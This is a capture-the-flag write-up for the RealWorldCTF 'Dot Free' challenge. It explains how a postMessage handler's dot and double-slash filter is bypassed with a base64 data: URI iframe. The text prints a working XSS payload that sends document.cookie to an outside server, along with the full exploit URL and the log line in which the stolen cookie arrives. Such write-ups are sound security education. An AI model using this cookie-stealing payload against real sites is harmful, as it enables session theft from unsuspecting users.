# Dot Free

This was another interesting challenge in the RealWorldCTF

```
All the IP addresses and domain names have dots, but can you hack without dot?  
  
[http://13.57.104.34/](http://13.57.104.34/)
```

Opening it up, we are presented with a simple page which takes a URL and submits it. Opening a non existent page, we are presented with this error

![lol](https://i.imgur.com/ATjYVSt.png)

Ah XSSWebsite, so it's probably a XSS challenge. There is probably a bot running on the backend which visits the URL we send.

I tried sending a bunch of domains pointing to my servers but I never received a request, so it probably only visits the it's own url. 

Our aim is to find an XSS and probably get the bot's cookie (or some header).

We find this interesting shit in the source of index.html

```js
function lls(src) {
        var el = document.createElement('script');
        if (el) {
            el.setAttribute('type', 'text/javascript');
            el.src = src;
            document.body.appendChild(el);
        }
    };
    function lce(doc, def, parent) {
        var el = null;
        if (typeof doc.createElementNS != "undefined") el = doc.createElementNS("http://www.w3.org/1999/xhtml", def[0]);
        else if (typeof doc.createElement != "undefined") el = doc.createElement(def[0]);
        if (!el) return false;
        for (var i = 1; i < def.length; i++) el.setAttribute(def[i++], def[i]);
        if (parent) parent.appendChild(el);
        return el;
    };
    window.addEventListener('message', function (e) {
        if (e.data.iframe) {
            if (e.data.iframe && e.data.iframe.value.indexOf('.') == -1 && e.data.iframe.value.indexOf("//") == -1 && e.data.iframe.value.indexOf("。") == -1 && e.data.iframe.value && typeof(e.data.iframe != 'object')) {
                if (e.data.iframe.type == "iframe") {
                    lce(doc, ['iframe', 'width', '0', 'height', '0', 'src', e.data.iframe.value], parent);
                } else {
                    lls(e.data.iframe.value)
                }
            }
        }
    }, false);
    window.onload = function (ev) {
        postMessage(JSON.parse(decodeURIComponent(location.search.substr(1))), '*')
    }
   ```


So this will basically take our data right after the first "?" in the URL, parse it as a JSON object and do some validation checks on it and if it passes all of them, then it will append it to the DOM as a source of a iframe.

Let's look at the checks:

```
        if (e.data.iframe) {
            if (e.data.iframe && e.data.iframe.value.indexOf('.') == -1 && e.data.iframe.value.indexOf("//") == -1 && e.data.iframe.value.indexOf("。") == -1 && e.data.iframe.value && typeof(e.data.iframe != 'object'))
  ```
 This doesn't look hard at all.          

So we can't have `//` and `.` in our value. I knew we can use data:// URI in a iframe source and it executes in the context of the current domain and since we can do like:
```
data:text/html;base64,<base64 data>
```
It doesn't require `//` or `.` . The final check is somewhat troll: `typeof(e.data.iframe != 'object')`. 

It should've been:
```
typeof(e.data.iframe) != 'object'
```

So our final payload is like 

```
{"iframe":{"value":"data:text/html;base64,dmFyIHAgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsgcC5vcGVuKCdHRVQnLCdodHRwOi8vMTk5LjI0Ny4yOC45MS9sb2wucGhwPz0nK2RvY3VtZW50LmNvb2tpZSk7IHAuc2VuZCgpOw=="}}
```

The base64 simply decodes to 

```
var p = new XMLHttpRequest(); p.open('GET','http://199.247.28.91/lol.php?='+document.cookie); p.send();
```

Which sends the cookie to our server. Our final link becomes
```
http://13.57.104.34/?{"iframe":{"value":"data:text/html;base64,dmFyIHAgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsgcC5vcGVuKCdHRVQnLCdodHRwOi8vMTk5LjI0Ny4yOC45MS9sb2wucGhwPz0nK2RvY3VtZW50LmNvb2tpZSk7IHAuc2VuZCgpOw=="}}
```

Sending that to the bot, we receive the flag on our server :)

```
13.57.104.34 - - [30/Jul/2018:08:38:48 +0000] "GET /lol.php?=flag=rwctf%7BL00kI5TheFlo9%7D HTTP/1.1" 200 235 "http://127.0.0.1/?%7B%22iframe%22:%7B%22value%22:%22data:text/html;base64,dmFyIHAgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsgcC5vcGVuKCdHRVQnLCdodHRwOi8vMTk5LjI0Ny4yOC45MS9sb2wucGhwPz0nK2RvY3VtZW50LmNvb2tpZSk7IHAuc2VuZCgpOw==%22%7D%7D" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
```

The flag is `rwctf{L00kI5TheFlo9}`
